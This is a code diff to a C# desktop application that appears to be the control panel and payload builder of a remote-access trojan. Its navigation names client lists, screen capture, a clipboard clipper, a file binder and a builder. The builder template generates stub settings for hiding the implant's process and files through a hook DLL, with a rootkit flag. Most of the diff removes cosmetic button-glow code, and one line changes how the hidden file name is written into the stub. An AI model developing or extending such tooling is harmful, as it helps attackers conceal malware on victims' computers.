@@ -2959,7 +2959,7 @@ internal static class Config
     // HiddenProcessName = install filename without extension = DLL prefix
     // The hook DLL reads its own filename as the prefix and hides everything starting with it.
     public const string HiddenProcessName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
-    public const string HiddenFileName = ""{Esc(installFileName.ToLowerInvariant())}"";
+    public const string HiddenFileName = ""{Esc(installFileName)}"";
 
     public const bool EnableRootkit = false;
 {hookDllLine}
@@ -5821,84 +5821,6 @@ Read-Host 'Press Enter to close'
     private bool _navSyncing;
     private bool _langSyncing;
 
-    private void NavBtn_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
-    {
-        if (sender is not System.Windows.Controls.RadioButton btn) return;
-        if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
-        if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
-        if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
-
-        // Cancel any leave-fade so the trigger Setter (Opacity=1) retakes control
-        glow.BeginAnimation(Border.OpacityProperty, null);
-
-        // Adapt glow to current accent: bright white-tinted hot-spot + accent halo
-        if (TryFindResource("AccentColor") is System.Windows.Media.Color accent)
-        {
-            // Blend accent toward white for a luminous "light source" centre
-            byte hr = (byte)(accent.R + (255 - accent.R) * 0.55);
-            byte hg = (byte)(accent.G + (255 - accent.G) * 0.55);
-            byte hb = (byte)(accent.B + (255 - accent.B) * 0.55);
-            rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(55, hr, hg, hb);
-            rgb.GradientStops[1].Color = System.Windows.Media.Color.FromArgb(15, accent.R, accent.G, accent.B);
-        }
-
-        var pos = e.GetPosition(btn);
-        double cx = pos.X / Math.Max(btn.ActualWidth, 1);
-        double cy = pos.Y / Math.Max(btn.ActualHeight, 1);
-        rgb.GradientOrigin = new System.Windows.Point(cx, cy);
-        rgb.Center         = new System.Windows.Point(cx, cy);
-    }
-
-    private void NavBtn_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e)
-    {
-        if (sender is not System.Windows.Controls.RadioButton btn) return;
-        if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
-        if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
-        if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
-
-        // Smooth fade to the resting value (0 when not selected, 0.22 when selected)
-        bool isChecked     = btn.IsChecked == true;
-        double restOpacity = isChecked ? 0.22 : 0.0;
-        var fade = new System.Windows.Media.Animation.DoubleAnimation(
-            restOpacity, TimeSpan.FromMilliseconds(280))
-        {
-            EasingFunction = new System.Windows.Media.Animation.CubicEase
-                { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut },
-            FillBehavior = System.Windows.Media.Animation.FillBehavior.Stop
-        };
-        // After fading, re-centre the glow on the active button
-        if (isChecked) fade.Completed += (_, _) => ApplyNavBtnGlow(btn);
-        else
-        {
-            rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
-            rgb.Center         = new System.Windows.Point(0.5, 0.5);
-        }
-        glow.BeginAnimation(Border.OpacityProperty, fade);
-    }
-
-    // Re-applies the accent-coloured glow centred on a nav button (called when it becomes
-    // selected or the accent changes, so the resting glow is always theme-accurate).
-    private void ApplyNavBtnGlow(System.Windows.Controls.RadioButton btn)
-    {
-        try
-        {
-            btn.ApplyTemplate();
-            if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
-            if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
-            if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
-            if (TryFindResource("AccentColor") is System.Windows.Media.Color accent)
-            {
-                byte hr = (byte)(accent.R + (255 - accent.R) * 0.55);
-                byte hg = (byte)(accent.G + (255 - accent.G) * 0.55);
-                byte hb = (byte)(accent.B + (255 - accent.B) * 0.55);
-                rgb.GradientStops[0].Color = System.Windows.Media.Color.FromArgb(98, hr, hg, hb);
-                rgb.GradientStops[1].Color = System.Windows.Media.Color.FromArgb(34, accent.R, accent.G, accent.B);
-                rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
-                rgb.Center         = new System.Windows.Point(0.5, 0.5);
-            }
-        }
-        catch { }
-    }
 
     private void Nav_Checked(object sender, RoutedEventArgs e)
     {
@@ -5923,9 +5845,6 @@ Read-Host 'Press Enter to close'
         if (idx >= 0 && MainTabControl.SelectedIndex != idx)
             MainTabControl.SelectedIndex = idx;
         if (idx >= 0) UiPrefs.Set("ActiveNav", idx);
-
-        // Accent-colour the resting glow on the newly-selected button
-        ApplyNavBtnGlow(rb);
     }
 
     private void SyncNavButtons(int idx)
@@ -6161,14 +6080,6 @@ Read-Host 'Press Enter to close'
             r2["RowHoverBgBrush"] = hoverBrush;
             Resources["RowHoverBgBrush"] = hoverBrush;
 
-            // Re-apply accent glow on the active nav button after accent colour settles
-            System.Windows.Controls.RadioButton?[] _navBtns =
-            [
-                NavDashboard, NavOnline, NavAllClients, NavBuilder, NavAutoTask,
-                NavScreen, NavClipper, NavBinder, NavWinNotify, NavLogs, NavSettings, NavAbout
-            ];
-            foreach (var nb in _navBtns)
-                if (nb?.IsChecked == true) ApplyNavBtnGlow(nb);
         }, System.Windows.Threading.DispatcherPriority.ContextIdle);
 
         // Write to Application.Current.Resources so ALL open windows update immediately
